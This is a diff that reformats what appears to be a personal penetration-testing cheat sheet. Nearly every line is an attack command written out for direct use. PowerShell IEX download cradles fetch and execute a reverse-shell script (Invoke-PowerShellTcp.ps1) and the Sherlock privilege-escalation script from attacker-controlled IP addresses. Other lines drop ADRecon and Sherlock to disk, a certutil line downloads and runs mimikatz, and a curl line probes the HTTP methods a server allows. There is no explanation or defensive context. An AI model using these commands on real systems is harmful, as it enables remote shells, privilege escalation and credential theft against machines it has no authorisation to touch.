@@ -1,26 +1,25 @@
-way 1 =>     Download & Execute , Without Writing on Disk ==>
+
+1) Powershell ==> 
+          a) way 1 : Download & Execute , Without Writing on Disk ==>
  
-powershell.exe "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.8:8000/Invoke-PowerShellTcp.ps1')"
+                 powershell.exe "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.8:8000/Invoke-PowerShellTcp.ps1')"
+                 powershell.exe "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.26:8000/Sherlock.ps1'); Find-AllVulns"
+                 
+                 
 
-way 2 ==> Download and Write on Disk ==>                      ==> from inside of powerview        (New-Object Net.WebClient).DownloadFile('http://10.17.20.181:8000/ADRecon.ps1', 'ADRecon.ps1')
-
-powershell -c (New-Object Net.WebClient).DownloadFile('http://10.10.14.37:8000/Sherlock.ps1', 'sherloack.ps1')
-
-way 3 ==> Sherlock local exploits ==>
-
-powershell.exe "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.26:8000/Sherlock.ps1'); Find-AllVulns"
-
-
-
-
-way 4 ==> download and execute without file write
-
-certutil.exe -urlcache -split -f http://10.11.1.198:8080/mimikatz.exe mimikatz.exe & mimikatz.exe
+           b) way 2 : Download and Write on Disk ==>                     
+                        ==> from inside of powerview       
+                                                (New-Object Net.WebClient).DownloadFile('http://10.17.20.181:8000/ADRecon.ps1', 'ADRecon.ps1')
+                        
+                        ==> from out-side of powerview       
+                                  powershell -c (New-Object Net.WebClient).DownloadFile('http://10.10.14.37:8000/Sherlock.ps1', 'sherloack.ps1')
 
 
+2) certutil  ==> 
 
+                  certutil.exe -urlcache -split -f http://10.11.1.198:8080/mimikatz.exe mimikatz.exe & mimikatz.exe
 
 
 list allowed http methods ==>
 
-curl -v -X OPTIONS http://192.168.1.109
+                   curl -v -X OPTIONS http://192.168.1.109
